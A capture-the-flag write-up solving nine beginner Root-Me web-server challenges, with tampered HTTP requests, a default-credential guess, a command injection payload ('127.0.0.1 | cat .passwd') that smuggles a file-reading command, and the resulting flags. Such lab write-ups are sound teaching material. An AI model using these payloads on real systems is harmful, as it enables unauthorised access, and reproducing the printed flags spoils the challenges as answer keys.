---
title: RootMe WebServer 04-12
date: 2023-11-10
categories: [RootMe, WebServer]
tags: [RootMe, RootMe - WebServer, WriteUp]
author: barabulkit
---

# HTTP - User-agent

in this one we just need to modify user agent
```http
GET /web-serveur/ch2/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: admin
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

and we will get password `rr$Li9%L34qd1AAe27`

# Weak password

there is a page with basic auth, solved by just trying default creds `admin:admin`
```http
GET /web-serveur/ch3/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Authorization: Basic YWRtaW46YWRtaW4=
```

this is the response i got
```html
<html>
  <head>
  </head>

  <body>
    <div>
      <br/>
      <h3>Bien joué, vous pouvez utiliser ce mot de passe pour valider le challenge</h3>
      <br/><br/>
      <h3>Well done, you can use this password to validate the challenge</h3>
    </div>
  </body>
</html>
```
so the flag to validate challenge is `admin`

# PHP - Command injection

Simple command injection, even no characters escape
```shell
127.0.0.1 | cat .passwd
```

and we get flag `S3rv1ceP1n9Sup3rS3cure`

# Backup file

This challenge is solved by looking into index.php backup file. \
i had a problem with finding it, i tried index.php.bak, index.php.backup, looked for robots.txt and so on, and wasn't able to find it. \
Finally i got a direction from [OWASP Testing guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information) about index.php~ and the challenge was done

```shell
cat index.php\~
```

```php
<?php

$username="ch11";
$password="OCCY9AcNm1tj";


echo '
      <html>
      <body>
        <h1>Authentication v 0.00</h1>
';

if ($_POST["username"]!="" && $_POST["password"]!=""){
    if ($_POST["username"]==$user && $_POST["password"]==$password)
    {
      print("<h2>Welcome back {$row['username']} !</h2>");
      print("<h3>Your informations :</h3><p>- username : $row[username]</p><br />");
      print("To validate the challenge use this password</b>");
    } else {
      print("<h3>Error : no such user/password</h2><br />");

    }
}

echo '
        <form action="" method="post">
          Login&nbsp;<br/>
          <input type="text" name="username" /><br/><br/>
          Password&nbsp;<br/>
          <input type="password" name="password" /><br/><br/>
          <br/><br/>
          <input type="submit" value="connect" /><br/><br/>
        </form>
      </body>
      </html>
';

?> 
```

the flag is `OCCY9AcNm1tj`

# HTTP - Directory indexing

When we open source code for the page and in it we can see commented admin/pass.html
When we visit this page we can see record that we are rick rolled, but we can visit just admin/
and see directory list in it with backup dir and admin.txt in it
and there is what we are looking for `Password / Mot de passe : LINUX`

# HTTP - Headers

Default request looks like
```http
GET /web-serveur/ch5/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

and we will get response headers
```http
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 10 Nov 2023 13:17:33 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
Header-RootMe-Admin: none
Content-Length: 272
```

And there is custom header `Header-RootMe-Admin` in response
We can add it to initial request
```http
GET /web-serveur/ch5/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Header-RootMe-Admin: True
Connection: close
Upgrade-Insecure-Requests: 1
```

And get html response with validation flag
```html
<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<p>Content is not the only part of an HTTP response!</p>
<p>You dit it ! You can validate the challenge with the password HeadersMayBeUseful
</p></body>
</html>
```

# HTTP - POST

in response to default request we can see next html
```html
<li>Score to beat: <strong>999999</strong></li>
```

challenge is solved by sending score that will be more than 999999
```http
POST /web-serveur/ch56/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://challenge01.root-me.org
Connection: close
Referer: http://challenge01.root-me.org/web-serveur/ch56/
Upgrade-Insecure-Requests: 1

score=1000000&generate=Give+a+try%21
```

out flag is in response 
```html
<p>Flag to validate the challenge: <strong>H7tp_h4s_N0_s3Cr37S_F0r_y0U
</strong></p>
```

# HTTP - Improper redirect

after default request we still get flag in response before redirected to login page
```html
<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<h1>Welcome !</h1>

<p>Yeah ! The redirection is OK, but without exit() after the header('Location: ...'), PHP just continue the execution and send the page content !...</p>
<p><a href="http://cwe.mitre.org/data/definitions/698.html">CWE-698: Execution After Redirect (EAR)</a></p>
<p>The flag is : ExecutionAfterRedirectIsBad
</p>
</body>
</html>
```

# HTTP - Verb tampering

From the challenge name we can understand that we need to enumerate http methods, i got flag from OPTIONS method
```http
OPTIONS /web-serveur/ch8/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Authorization: Basic MTIzOjEyMw==
```

flag is in response
```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html><head>
</head>

<h1>Mot de passe / password : a23e$dme96d3saez$$prap
</h1>
</body></html>
```